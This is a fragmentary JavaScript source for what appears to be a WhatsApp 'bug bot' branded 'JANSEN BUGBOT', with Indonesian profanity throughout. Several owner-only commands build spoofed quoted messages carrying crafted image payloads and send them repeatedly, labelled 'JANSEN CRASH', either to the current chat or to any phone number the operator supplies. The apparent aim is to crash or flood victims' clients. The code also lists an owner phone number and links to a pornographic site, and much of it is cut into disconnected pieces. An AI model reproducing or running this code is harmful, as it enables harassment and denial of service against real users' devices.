...
`.trim())
        ...
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            puterakontolpunyabiji = `Bug Jansen Sudah Bekerja Masszeh!!`
            await m.reply("Bug Bot Jansen".trim())
            await m.reply("Bug Bot Jansen".trim())
...
`
              image = fs.readFileSync('./lib/gyzxo.jpg'),
gyzxo666.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: anu })
}
break
            case 'kelentod':
            kelentod = `Wa.me/6281364399250 Nomor Owner Bot!!!`
...
gyzxo666.sendMessage(m.chat, buttonMessage)
 ...
 case 'masszeh':
if (!isCreator) throw mess.owner
kontolu = '``⚡ JANSEN BUGBOT ⚡``',
gyzxo666.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${bugweb}`,body: '⚡ JANSEN BUGBOT ⚡',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
break
case 'kontol':
if (!isCreator) throw mess.owner
y1 = fs.readFileSync('./pirtex/iphone.mp3')
gyzxo666.sendMessage(m.chat, {document: y1, fileName: `🥶  𝐉𝚫𝐍𝐒𝚵𝐍 𝐁Ṏ𝐓 🥶 ${doctext}.mp3`, quoted: m})
break
}
...
kontolputralist = [
                {
                title: `⚡ JANSEN BUGBOT ⚡ ${ranzmods} ${buttonvirus}`,
                rows: [
                ...
                gyzxo666.sendListMsg(m.chat, `⚡ JANSEN BUGBOT ⚡`, gyzxo666.user.name, `Hay Ngentod`, `⚡ JANSEN BUGBOT ⚡`, kontolputralist, m)
break
case 'teg666': {
                if (!isCreator) throw mess.owner
                if (!m.isGroup) throw mess.group                
         ...
         case 'kasian':               
          if (!isCreator) throw mess.owner
             asukonyol11 = { 
                    ...
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `Jansen Was Here!!`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            gyzxo666.sendMessage(m.chat, {text:"Bug Jansen New"},{quoted:asukonyol11})
            break
            case 'ajg':
                if (!isCreator) throw mess.owner
                ...
                gasbugpc = { 
                    ...
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `Bug Bot Jansen`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
                gyzxo666.sendMessage(`${text}@s.whatsapp.net`, {text:"Jansen Was Here!!"},{quoted:gasbugpc})
                m.reply(`succes`)
          ...
          if (!isCreator) throw mess.owner
             asukonyol11 = { 
                    ...
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `©JANSEN CRASH`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await gyzxo666.sendMessage(m.chat, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            await gyzxo666.sendMessage(m.chat, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            await gyzxo666.sendMessage(m.chat, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            await gyzxo666.sendMessage(m.chat, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            await gyzxo666.sendMessage(m.chat, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
          ...
          if (!text) throw `NOMER NYA MNA KONTOL?`
            ...
            await gyzxo666.sendMessage(`${text}@s.whatsapp.net`, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            await gyzxo666.sendMessage(`${text}@s.whatsapp.net`, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            await gyzxo666.sendMessage(`${text}@s.whatsapp.net`, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            await gyzxo666.sendMessage(`${text}@s.whatsapp.net`, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            await gyzxo666.sendMessage(`${text}@s.whatsapp.net`, {text:"©JANSEN CRASH"},{quoted:asukonyol11})
            ...
            case 'meki' : {
                ...
                await gyzxo666.sendMessage(Pe, {text:"©JANSEN BUG"}, {quoted: a})
                await gyzxo666.sendMessage(Pe, {text:"©JANSEN BUG"}, {quoted: a})
                await gyzxo666.sendMessage(Pe, {text:"©JANSEN BUG"}, {quoted: a})
                await gyzxo666.sendMessage(Pe, {text:"©JANSEN BUG"}, {quoted: a})
                await gyzxo666.sendMessage(Pe, {text:"©JANSEN BUG"}, {quoted: a})
...
m.reply(`Udah Tuh Dek!!`)
                ...
                case 'woidek' : {
                    a = await gyzxo666.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await gyzxo666.sendMessage(m.chat, {text:"©JANSEN BUG"}, {quoted: a})
                    await gyzxo666.sendMessage(m.chat, {text:"©JANSEN BUG"}, {quoted: a})
                    await gyzxo666.sendMessage(m.chat, {text:"©JANSEN BUG"}, {quoted: a})
                    await gyzxo666.sendMessage(m.chat, {text:"©JANSEN BUG"}, {quoted: a})
                    await gyzxo666.sendMessage(m.chat, {text:"©JANSEN BUG"}, {quoted: a})
